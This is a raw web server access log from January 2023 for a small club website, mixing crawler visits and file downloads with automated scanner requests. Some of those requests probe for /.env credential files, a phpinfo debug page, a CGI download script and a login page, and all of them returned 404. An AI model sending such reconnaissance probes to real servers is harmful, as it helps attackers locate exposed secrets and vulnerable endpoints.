::ffff:18.207.159.18 - - [29/Jan/2023:19:56:19 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:20:04:33 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.207.159.18 - - [29/Jan/2023:20:04:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:92.118.39.82 - - [29/Jan/2023:20:10:35 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:92.118.39.82 - - [29/Jan/2023:20:10:35 +0000] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 164 "-" "Hello World"
::ffff:114.119.140.60 - - [29/Jan/2023:20:13:59 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:95.214.235.205 - - [29/Jan/2023:20:30:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [29/Jan/2023:20:30:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.77.167.20 - - [29/Jan/2023:20:36:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:20:49:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [29/Jan/2023:20:49:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:15.235.114.125 - - [29/Jan/2023:21:01:24 +0000] "GET / HTTP/1.1" 200 57378 "-" "Ruby"
::ffff:136.49.58.152 - - [29/Jan/2023:21:01:57 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:101.32.209.199 - - [29/Jan/2023:21:08:19 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
